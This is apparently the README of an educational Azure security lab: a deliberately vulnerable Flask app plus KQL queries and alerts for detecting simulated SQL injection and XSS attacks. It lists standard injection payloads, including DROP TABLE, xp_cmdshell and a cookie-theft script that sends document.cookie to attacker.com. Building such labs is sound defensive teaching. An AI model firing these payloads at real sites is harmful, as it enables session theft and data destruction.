# 🔐 Security Lab - Azure Application Security Monitoring

## 📋 Project Overview

This project demonstrates comprehensive security monitoring for web applications using Azure services. It includes a Flask application with intentional vulnerabilities for attack simulation, complete logging infrastructure, and real-time security analysis capabilities.

## 🎥 Demo Video

🔗 **[YouTube Demo Link](https://youtu.be/UOuzitw3ecQ)**


## 🏗️ Architecture

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────────┐
│   Test Client   │───▶│  Azure App       │───▶│ Azure Log Analytics │
│  (REST Client)  │    │  Service         │    │   Workspace         │
└─────────────────┘    │                  │    │                     │
                       │ Flask App        │    │ - HTTP Logs         │
                       │ - API Endpoints  │    │ - Console Logs      │
                       │ - Attack Sim     │    │ - Security Events   │
                       └──────────────────┘    └─────────────────────┘
                                                         │
                                                         ▼
                                               ┌─────────────────────┐
                                               │ Azure Monitor       │
                                               │ - KQL Queries       │
                                               │ - Dashboards        │
                                               │ - Alerts            │
                                               └─────────────────────┘
```

## 🎯 Features

### Security Attack Simulation
- **SQL Injection Testing**: Multiple attack vectors and payloads
- **XSS Attack Testing**: Script injection, DOM manipulation, event handlers
- **Brute Force Simulation**: Rapid attack pattern generation
- **Invalid Request Testing**: 404 errors and malformed requests

### Monitoring & Analytics
- **Real-time Log Collection**: HTTP requests, application logs, security events
- **Advanced Query Capabilities**: Custom KQL queries for threat detection
- **Attack Pattern Analysis**: Statistical analysis of attack types and frequencies
- **Response Time Monitoring**: Performance impact analysis during attacks

### Security Features
- **Comprehensive Logging**: All requests and responses logged with timestamps
- **Attack Classification**: Automatic categorization of different attack types
- **Pattern Detection**: Identification of coordinated attack campaigns
- **Evidence Collection**: Detailed forensic data for each security event

## 🚀 Deployment Information

### Azure Resources
- **Resource Group**: `rg-security-lab`
- **App Service**: `security-lab-93823-20250618`
- **App Service Plan**: `ASP-rgsecuritylab-8eb1` (Linux, B1)
- **Log Analytics Workspace**: `law-security-lab`
- **Application URL**: https://security-lab-93823-20250618.azurewebsites.net

### Environment Configuration
- **Python Runtime**: 3.9
- **Web Framework**: Flask 2.3.2
- **CORS Support**: Enabled for cross-origin requests
- **Logging Level**: INFO with detailed request tracking

## 📡 API Endpoints

### Health & Status
```http
GET /api/health
```
Returns application health status and timestamp.

**Response:**
```json
{
    "status": "healthy",
    "timestamp": "2025-06-19T10:30:00Z",
    "version": "1.0.0"
}
```

### Security Logs Management
```http
GET /api/logs
```
Retrieves all collected security logs.

```http
POST /api/clear-logs
```
Clears all security logs (admin function).

### Attack Simulation Endpoints

#### SQL Injection Testing
```http
POST /api/attack/sql
Content-Type: application/json

{
    "query": "SELECT * FROM users WHERE id = 1 OR 1=1"
}
```

**Common SQL Injection Payloads:**
- `1' OR '1'='1`
- `'; DROP TABLE users; --`
- `1 UNION SELECT username, password FROM admin_users`
- `1'; EXEC xp_cmdshell('dir'); --`

#### XSS Attack Testing
```http
POST /api/attack/xss
Content-Type: application/json

{
    "payload": "<script>alert('XSS Attack')</script>"
}
```

**Common XSS Payloads:**
- `<script>alert('XSS')</script>`
- `<img src=x onerror='alert(\"XSS\")'>`
- `javascript:alert('XSS')`
- `<svg onload='alert(\"XSS\")'></svg>`

## 🧪 Testing Guide

### Prerequisites
- **VS Code** with **REST Client** extension installed
- **Azure Portal** access for log analysis
- **Azure CLI** (optional, for deployment)

### Running Tests

1. **Open test-app.http** in VS Code
2. **Execute requests** by clicking "Send Request" above each test
3. **Monitor results** in Azure Log Analytics

### Test Scenarios

#### Basic Health Check
```http
GET {{base_url}}/api/health
```

#### SQL Injection Attack Sequence
```http
# Basic OR injection
POST {{base_url}}/api/attack/sql
Content-Type: application/json
{
    "query": "SELECT * FROM users WHERE id = 1 OR 1=1"
}

# Union-based attack
POST {{base_url}}/api/attack/sql
Content-Type: application/json
{
    "query": "1 UNION SELECT username, password FROM admin_users"
}

# Database destruction attempt
POST {{base_url}}/api/attack/sql
Content-Type: application/json
{
    "query": "'; DROP TABLE users; --"
}
```

#### XSS Attack Sequence
```http
# Script injection
POST {{base_url}}/api/attack/xss
Content-Type: application/json
{
    "payload": "<script>alert('XSS Attack')</script>"
}

# Cookie theft simulation
POST {{base_url}}/api/attack/xss
Content-Type: application/json
{
    "payload": "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
}

# DOM manipulation
POST {{base_url}}/api/attack/xss
Content-Type: application/json
{
    "payload": "<img src=x onerror='document.body.innerHTML=\"<h1>Site Hacked</h1>\"'>"
}
```

## 📊 Log Analysis with KQL

### Access Azure Log Analytics
1. Go to **Azure Portal** → **law-security-lab** → **Logs**
2. Execute KQL queries for security analysis

### ⚠️ Important Notes
- Some fields like `CsUserAgent`, `CIp`, `CsBytes` may not be available in all Azure configurations
- Use `project *` to see all available fields: `AppServiceHTTPLogs | take 1 | project *`
- If queries fail, check available schema with: `AppServiceHTTPLogs | getschema`

### 🚀 Quick Start Queries

#### Simple Data Check
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(24h)
| take 10
```

#### Available Fields Discovery
```kql
AppServiceHTTPLogs
| take 1
| project *
```

### Essential KQL Queries

#### All HTTP Requests (Last 2 Hours)
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(2h)
| project TimeGenerated, CsMethod, CsUriStem, ScStatus
| order by TimeGenerated desc
```

#### Security Attack Detection
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(2h)
| where CsUriStem contains "attack"
| project TimeGenerated, CsMethod, CsUriStem, ScStatus
| order by TimeGenerated desc
```

#### SQL Injection Analysis
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(2h)
| where CsUriStem contains "attack/sql"
| summarize AttackCount = count() by bin(TimeGenerated, 5m)
| order by TimeGenerated desc
```

#### XSS Attack Analysis
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(2h)
| where CsUriStem contains "attack/xss"
| summarize AttackCount = count() by bin(TimeGenerated, 5m)
| order by TimeGenerated desc
```

#### Attack Pattern Statistics
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(24h)
| where CsUriStem contains "attack"
| summarize AttackCount = count() by AttackType = extract(@"attack/(\w+)", 1, CsUriStem)
| order by AttackCount desc
```

#### Application Performance Monitoring
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(2h)
| summarize AvgResponseTime = avg(TimeTaken), RequestCount = count() by bin(TimeGenerated, 5m)
| order by TimeGenerated desc
```

#### Failed Requests Analysis
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(2h)
| where ScStatus >= 400
| summarize ErrorCount = count() by ScStatus, CsUriStem
| order by ErrorCount desc
```

## 🔔 Alert Configuration

### Recommended Alerts

#### High Volume SQL Injection Alert
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(5m)
| where CsUriStem contains "attack/sql"
| summarize AttackCount = count()
| where AttackCount > 10
```

#### Rapid XSS Attack Alert
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(5m)
| where CsUriStem contains "attack/xss"
| summarize AttackCount = count()
| where AttackCount > 5
```

#### Application Health Alert
```kql
AppServiceHTTPLogs
| where TimeGenerated > ago(5m)
| where CsUriStem contains "/api/health"
| where ScStatus != 200
| summarize FailedHealthChecks = count()
| where FailedHealthChecks > 0
```

## 📈 Dashboard Configuration

### Creating Custom Dashboard

1. **Navigate to Azure Portal** → **Dashboards**
2. **Create new dashboard** → "Security Lab Monitoring"
3. **Add tiles** for each KQL query
4. **Configure refresh intervals** (5-15 minutes)

### Recommended Dashboard Tiles

1. **Attack Volume Over Time** (Line Chart)
2. **Attack Type Distribution** (Pie Chart)
3. **Response Status Codes** (Bar Chart)
4. **Top Attack Sources** (Table)
5. **Application Performance** (Metric Chart)
6. **Recent Security Events** (List)

## 🛡️ Security Considerations

### Production Recommendations
- **Remove attack simulation endpoints** in production deployments
- **Implement proper authentication** and authorization
- **Enable HTTPS only** with proper SSL certificates
- **Configure Web Application Firewall** (WAF)
- **Set up automated incident response** workflows

### Monitoring Best Practices
- **Regular log retention review** (cost management)
- **Alert threshold fine-tuning** (reduce false positives)
- **Correlation with external threat intelligence**
- **Integration with SIEM systems** for enterprise environments

## 🔧 Development Setup

### Local Development
```bash
# Clone repository
git clone <repository-url>
cd security-lab

# Create virtual environment
python -m venv venv
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate  # Windows

# Install dependencies
pip install -r requirements.txt

# Run locally
python app.py
```

### Environment Variables
```bash
export FLASK_ENV=development
export FLASK_DEBUG=True
export LOG_LEVEL=DEBUG
```

## 📦 Deployment

### Azure CLI Deployment
```bash
# Login to Azure
az login

# Create resource group
az group create --name rg-security-lab --location "East US"

# Create App Service plan
az appservice plan create --name security-lab-plan --resource-group rg-security-lab --is-linux --sku B1

# Create web app
az webapp create --name security-lab-app --resource-group rg-security-lab --plan security-lab-plan --runtime "PYTHON:3.9"

# Deploy application
az webapp deploy --resource-group rg-security-lab --name security-lab-app --src-path .
```

### GitHub Actions CI/CD
```yaml
name: Deploy to Azure App Service

on:
  push:
    branches: [ main ]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Set up Python
      uses: actions/setup-python@v2
      with:
        python-version: '3.9'
    - name: Deploy to Azure Web App
      uses: azure/webapps-deploy@v2
      with:
        app-name: 'security-lab-app'
        publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}
```

## 📚 Additional Resources

### Documentation
- [Azure App Service Documentation](https://docs.microsoft.com/en-us/azure/app-service/)
- [Azure Monitor Documentation](https://docs.microsoft.com/en-us/azure/azure-monitor/)
- [KQL Query Reference](https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/)

### Security References
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## ⚠️ Disclaimer

This application is for educational and demonstration purposes only. The intentional vulnerabilities should never be deployed in production environments. Use only in controlled, isolated environments for security testing and education.
